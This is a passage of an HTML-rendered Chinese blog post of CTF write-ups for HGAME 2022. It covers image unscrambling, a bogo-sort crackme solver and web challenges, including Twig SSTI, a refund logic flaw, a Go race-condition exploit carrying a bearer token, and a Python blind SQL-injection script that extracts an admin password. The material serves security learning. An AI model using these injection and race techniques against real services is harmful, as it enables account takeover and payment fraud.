new_height))</span><br><span class="line">idx = 0</span><br><span class="line">for n_w in range(new_width):</span><br><span class="line">	for n_h in range(new_height):</span><br><span class="line">		new_img.putpixel((n_w, n_h), pixs_list[idx])</span><br><span class="line">		idx += 1</span><br><span class="line">new_img.save(&#x27;27.png&#x27;)</span><br><span class="line">new_img.show()</span><br></pre></td></tr></table></figure>
+<p>得到图2<br><img src="https://s2.loli.net/2022/02/11/aLlEgMrj7qWOpfm.png"></p>
+<p>wp说这里运用到的是cat变化，wp里给的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def arnold_decode(image, a, b):</span><br><span class="line">    decode_image = np.zeros(shape=image.shape)</span><br><span class="line">    h, w = image.shape[0], image.shape[1]</span><br><span class="line">    N = h </span><br><span class="line">    for ori_x in range(h):</span><br><span class="line">        for ori_y in range(w):</span><br><span class="line">            new_x = ((a*b+1)*ori_x + (-b)* ori_y)% N </span><br><span class="line">            new_y = ((-a)*ori_x + ori_y) % N</span><br><span class="line">            decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]</span><br><span class="line">    return decode_image</span><br></pre></td></tr></table></figure>
+
+<p>网上大佬的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">img = Image.open(&#x27;ok1.png&#x27;)</span><br><span class="line">if img.mode == &quot;P&quot;:</span><br><span class="line">    img = img.convert(&quot;RGB&quot;)</span><br><span class="line">assert img.size[0] == img.size[1]</span><br><span class="line">dim = width, height = img.size</span><br><span class="line"></span><br><span class="line">st = 1</span><br><span class="line">a = 9</span><br><span class="line">b = 39</span><br><span class="line">for _ in range(st):</span><br><span class="line">    with Image.new(img.mode, dim) as canvas:</span><br><span class="line">        for nx in range(img.size[0]):</span><br><span class="line">            for ny in range(img.size[0]):</span><br><span class="line">                y = (ny - nx * a) % width</span><br><span class="line">                x = (nx - y * b) % height</span><br><span class="line">                canvas.putpixel((y, x), img.getpixel((ny, nx)))</span><br><span class="line">canvas.show()</span><br><span class="line">canvas.save(&#x27;28.png&#x27;)</span><br></pre></td></tr></table></figure>
+<p>得到图3：<br><img src="https://s2.loli.net/2022/02/11/VGbYtizx25WnEyO.png"></p>
+<p>npiet解密：<br><img src="https://s2.loli.net/2022/02/11/7ptnGlA8wBr2Nax.png"></p>
+<p>得出加法运算结论。</p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="creakme3"><a href="#creakme3" class="headerlink" title="creakme3"></a>creakme3</h2><p>IDA有插件或者版本合适的话其实可以反汇编pcc的，这里属于是出题人失误了。<br>题目用结构体数组保存了一组数据，其中第一个int为字符的ASCII码，第二个int为字符的顺序，使用猴子排序算法来对数据进行排序，如果排序成功就会输出flag。</p>
+<p>我做的时候是自己试了试就排出来了，放个官方wp的脚本吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct alpha</span><br><span class="line">&#123;</span><br><span class="line">    int ch;</span><br><span class="line">    int index;</span><br><span class="line">&#125;;</span><br><span class="line">struct alpha a[89] =</span><br><span class="line">&#123;</span><br><span class="line">    &#123; 48, 20093 &#125;, &#123; 48, 26557 &#125;, &#123; 48, 31304 &#125;, &#123; 48, 33442 &#125;, &#123; 48, 37694&#125;, &#123; 49, 39960 &#125;, &#123; 50, 23295 &#125;, &#123; 50, 27863 &#125;, &#123; 50, 42698 &#125;, &#123; 50,48505 &#125;, &#123; 50, 52925 &#125;, &#123; 51, 12874 &#125;, &#123; 51, 12946 &#125;, &#123; 51, 14597 &#125;, &#123;51, 17041 &#125;, &#123; 51, 23262 &#125;, &#123; 51, 28319 &#125;, &#123; 51, 42282 &#125;, &#123; 51, 48693 &#125;,&#123; 51, 52067 &#125;, &#123; 53, 32571 &#125;, &#123; 56, 14612 &#125;, &#123; 56, 45741 &#125;, &#123; 57, 14554 &#125;,&#123; 57, 20048 &#125;, &#123; 57, 27138 &#125;, &#123; 57, 45327 &#125;, &#123; 66, 30949 &#125;, &#123; 95, 32502&#125;, &#123; 95, 35235 &#125;, &#123; 95, 36541 &#125;, &#123; 95, 38371 &#125;, &#123; 97, 29658 &#125;, &#123; 100,21388 &#125;, &#123; 100, 25403 &#125;, &#123; 100, 40604 &#125;, &#123; 100, 46987 &#125;, &#123; 100, 51302 &#125;,&#123; 101, 12974 &#125;, &#123; 101, 30329 &#125;, &#123; 102, 10983 &#125;, &#123; 102, 19818 &#125;, &#123; 102,22280 &#125;, &#123; 102, 26128 &#125;, &#123; 102, 41560 &#125;, &#123; 102, 47116 &#125;, &#123; 102, 51333 &#125;,&#123; 103, 28938 &#125;, &#123; 103, 31988 &#125;, &#123; 104, 16246 &#125;, &#123; 104, 28715 &#125;, &#123; 104,41966 &#125;, &#123; 104, 44368 &#125;, &#123; 104, 47815 &#125;, &#123; 105, 16420 &#125;, &#123; 105, 35362 &#125;,&#123; 105, 49237 &#125;, &#123; 106, 11090 &#125;, &#123; 106, 50823 &#125;, &#123; 107, 24320 &#125;, &#123; 107,50199 &#125;, &#123; 108, 24962 &#125;, &#123; 109, 30171 &#125;, &#123; 110, 15457 &#125;, &#123; 110, 18838 &#125;,&#123; 110, 24001 &#125;, &#123; 111, 11638 &#125;, &#123; 111, 32023 &#125;, &#123; 111, 43291 &#125;, &#123; 112,39661 &#125;, &#123; 114, 17872 &#125;, &#123; 114, 33895 &#125;, &#123; 114, 43869 &#125;, &#123; 115, 20611 &#125;,&#123; 115, 25122 &#125;, &#123; 115, 36243 &#125;, &#123; 115, 37434 &#125;, &#123; 115, 38686 &#125;, &#123; 115,46266 &#125;, &#123; 115, 51077 &#125;, &#123; 116, 13656 &#125;, &#123; 116, 34493 &#125;, &#123; 116, 38712 &#125;,&#123; 117, 14096 &#125;, &#123; 117, 38777 &#125;, &#123; 119, 12095 &#125;, &#123; 119, 17629 &#125;, &#123; 123,30945 &#125;, &#123; 125, 40770 &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;89;i++)&#123;</span><br><span class="line">        for(int j=0;j&lt;89;j++)&#123;</span><br><span class="line">            if(a[i].index&lt;a[j].index)&#123;</span><br><span class="line">                struct alpha temp=a[i];</span><br><span class="line">                a[i]=a[j];</span><br><span class="line">                a[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(int i=0;i&lt;89;i++)&#123;</span><br><span class="line">        putchar(a[i].ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame&#123;B0go_50rt_is_s0_stup1d&#125;fh32orh98sdfh23ikjsdf32</span><br></pre></td></tr></table></figure>
+
+<p>flag:hgame{B0go_50rt_is_s0_stup1d}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h2><p>进入网页查看源码，发现提示<code>install.json</code>,查看后发现网页是twig模板：<br><img src="https://s2.loli.net/2022/02/06/Ipf7aXs5xwNyFqb.png"></p>
+<p>测试后发现在跳转界面存在ssti注入，尝试构建twig的payload测试：<br><img src="https://s2.loli.net/2022/02/06/kz9U3dscpPbEnZH.png"></p>
+<p>测试成功，接着获取flag文件就可以了，但是由于获取的内容不能存在hgame，因此要用base64的方式输出，接着解码得到flag：<br><img src="https://s2.loli.net/2022/02/06/iOICYQ7lqcEaGez.png"><br><img src="https://s2.loli.net/2022/02/06/trXYx7NvPQk13ub.png"></p>
+<h2 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>进入网页注册账号后，发现余额为9999，但是购买flag需要10000。观察页面发现除了flag还可以购买一个20元的徽章，购买流程是先下订单，再付款，而且付款后可以退款。</p>
+<p>尝试抓包后发现退款是只验证商品id的，因此我们先从订单，然后购买20元的徽章，接着退款并且改id，就可以发现我们退款了一个flag的价格：<br><img src="https://s2.loli.net/2022/02/06/o9T7j8WJrnehtbk.png"><br><img src="https://s2.loli.net/2022/02/06/MIgQniEf2aNJWK7.png"><br><img src="https://s2.loli.net/2022/02/06/ILkbUXENfliGwxY.png"></p>
+<p>最后购买flag，得到flag：<br><img src="https://s2.loli.net/2022/02/06/9J3AicKGvVSLE58.png"></p>
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>这题的实际考点是竞争上传，但是由于存在逻辑漏洞导致了非预期。</p>
+<blockquote>
+<p>先查询出用户余额，然后创建订单，最后更新用户余额（余额值取自查询出的余额扣除订单金额）。整个过程持续了超过500ms（正常不会这么慢，特地sleep是为了方便做题）。所以假如在500ms内有同一个用户的多个不同订单的支付请求打进来，不妨假设查询到的用户余额都是100币（因为还没超过500ms，第一个请求还未更新用户余额），那么最终的结果是订单全部支付成功，但是用户的余额仅仅更新为了(100-最后一个订单金额)。最后再手动依次取消支付成功的订单，余额就会变多。</p>
+</blockquote>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">type Ts struct &#123;</span><br><span class="line">	Uid int `json:&quot;uid&quot;`</span><br><span class="line">	Oid int `json:&quot;oid&quot;`</span><br><span class="line">	Amount int `json:&quot;amount&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func TestHgame(T *testing.T) &#123;</span><br><span class="line">	var ts Ts</span><br><span class="line">	ts.Uid = 1</span><br><span class="line">	ts.Oid = 7</span><br><span class="line">	ts.Amount = 5</span><br><span class="line">	go gorequest.New().Post(&quot;http://127.0.0.1:8003/apipay/create&quot;).</span><br><span class="line">		Set(&quot;Authorization&quot;, &quot;bearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDM3NTAyNjEsImlhdCI6MTY0MzY2Mzg2MSwidWlkIjoxfQ.b1QV-ubi277QQobG9sS-T4XKq0P78wGMlKZ3aQTFiNE&quot;).</span><br><span class="line">		SendStruct(&amp;ts).End()</span><br><span class="line">	var ts2 Ts</span><br><span class="line">	ts2.Uid = 1</span><br><span class="line">	ts2.Oid = 8</span><br><span class="line">	ts2.Amount = 5</span><br><span class="line">	go gorequest.New().Post(&quot;http://127.0.0.1:8003/api/paycreate&quot;).</span><br><span class="line">		Set(&quot;Authorization&quot;, &quot;bearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDM3NTAyNjEsImlhdCI6MTY0MzY2Mzg2MSwidWlkIjoxfQ.b1QV-ubi277QQobG9sS-T4XKq0P78wGMlKZ3aQTFiNE&quot;).</span><br><span class="line">		SendStruct(&amp;ts2).End()</span><br><span class="line">	time.Sleep(5 * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe"></a>LoginMe</h2><p>进网页直接给了test的账号密码，登陆发现需要admin的账号密码才能获取flag。还给了hint：<br><img src="https://s2.loli.net/2022/02/06/7hOTQpl3s2XYIRM.png"></p>
+<p>这题要用like模糊查询来进行sql注入，爆出密码，这里有一个坑点就是post时数据是以json上传的，刚开始注的时候忘记了这点导致一直失败，编写脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">strs = string.printable</span><br><span class="line">url = &quot;http://339a4b1eda.login.summ3r.top:60067/login&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line">headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,100):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payload = f&quot;admin&#x27; and password like &#x27;&#123;name+j&#125;%&quot;</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;: payload,</span><br><span class="line">                &quot;password&quot;: &quot;text&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            r = s.post(url=url, data=json.dumps(data), headers=headers)</span><br><span class="line">            if &quot;success&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;%&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>爆出密码：<br><img src="https://s2.loli.net/2022/02/06/HeA3RyQ2swMmTpj.png"></p>
+<p>最后登录即可拿到flag：<br><img src="https://s2.loli.net/2022/02/06/GIoFzES2k4p6PTi.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/02/09/pop%E9%93%BE%E7%9A%84%E6%9E%84%E5%BB%BA/" rel="next" title="pop链的构建">
+                <i class="fa fa-chevron-left"></i> pop链的构建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number"></span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Block-Cipher"><span class="nav-number">1.</span> <span class="nav-text">Block Cipher</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Multi-Prime-RSA"><span class="nav-number">2.</span> <span class="nav-text">Multi Prime RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA-Attack-3"><span class="nav-number">3.</span> <span class="nav-text">RSA Attack 3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number"></span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%A1%E4%B8%AD%E6%AF%92"><span class="nav-number">1.</span> <span class="nav-text">卡中毒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%81%E4%B8%8D%E5%96%9C%E6%AC%A2%E7%8C%AB%E7%8C%AB%E5%91%A2"><span class="nav-number">2.</span> <span class="nav-text">谁不喜欢猫猫呢</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-number"></span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#creakme3"><span class="nav-number">1.</span> <span class="nav-text">creakme3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number"></span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SecurityCenter"><span class="nav-number">1.</span> <span class="nav-text">SecurityCenter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vidar-shop-demo"><span class="nav-number">2.</span> <span class="nav-text">Vidar shop demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">2.1.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F"><span class="nav-number">2.2.</span> <span class="nav-text">预期</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LoginMe"><span class="nav-number">3.</span> <span class="nav-text">LoginMe</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
